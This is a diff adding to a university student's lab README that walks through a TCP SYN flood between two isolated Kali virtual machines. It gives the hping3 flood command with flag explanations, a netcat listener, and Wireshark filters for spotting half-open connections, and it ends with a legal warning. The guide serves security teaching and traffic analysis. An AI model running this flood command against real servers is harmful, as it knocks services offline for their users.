@@ -57,3 +57,95 @@ ping 10.0.2.15
 ```
 ![1](https://github.com/user-attachments/assets/fafe039b-40dc-4e2c-a585-b5ba62c63eb1)
 
+Expect replies to confirm network setup.
+
+---
+### 🧪 Preparation
+On Kali (Victim):
+Install necessary tools and run a TCP listener:
+```bash
+sudo apt update
+sudo apt install net-tools netcat wireshark -y
+sudo nc -l -p 80
+```
+On Kali (Attacker):
+Install hping3 and Wireshark:
+```bash
+sudo apt update
+sudo apt install hping3 wireshark -y
+```
+
+---
+
+### ⚔️ Launch the SYN Flood Attack
+On Kali (Attacker):
+Run SYN flood targeting victim:
+```bash
+sudo hping3 -S --flood -V -p 80 10.0.2.15
+```
+```-S```: Send SYN packets
+
+```--flood```: Send packets as fast as possible
+
+```-V```: Verbose output
+
+```-p 80```: Target port 80 (same as victim listener)
+
+```10.0.2.15```: Victim static IP
+
+---
+
+### 📈 Analyze with Wireshark
+On Kali (Victim):
+1. Launch Wireshark with root or sudo:
+```bash
+sudo wireshark
+```
+2. Select interface eth0 or whichever corresponds to your network.
+
+3. Start packet capture.
+
+4. Apply this display filter to see SYN flood traffic:
+ ```bash
+   tcp.flags.syn == 1 and tcp.flags.ack == 0
+   ```
+5. Observe:
+
+- Large burst of SYN packets flooding in rapidly.
+
+- No complete TCP handshake (no matching ACKs).
+
+- Many half-open connections visible.
+
+---
+
+### 🧠 How to Confirm the Server is Flooded and Down
+
+System Load: CPU will be full and unresponsive. A huge number of packet will be visible in wireshark. 
+May see increased load due to handling many half-open connections.
+
+![Screenshot (4)](https://github.com/user-attachments/assets/838efa13-2a1a-440a-9ade-0d633415c532)
+
+---
+
+### 🧼 Clean Up
+Stop the attack on attacker with CTRL+C
+
+Stop Wireshark capture and save the .pcap file if desired
+
+Power off both VMs or reset IP settings if needed
+
+### 📛 Legal Warning
+Performing SYN flood attacks outside of an isolated, authorized lab environment is prohibited by law. This guide is intended only for cybersecurity students and professionals studying in ethical, simulated environments.
+
+---
+
+### 👨‍🎓 Author
+Nahid Chowdhury, University of Dhaka
+Contact: cyberxpertme@gmail.com
+
+
+
+
+
+
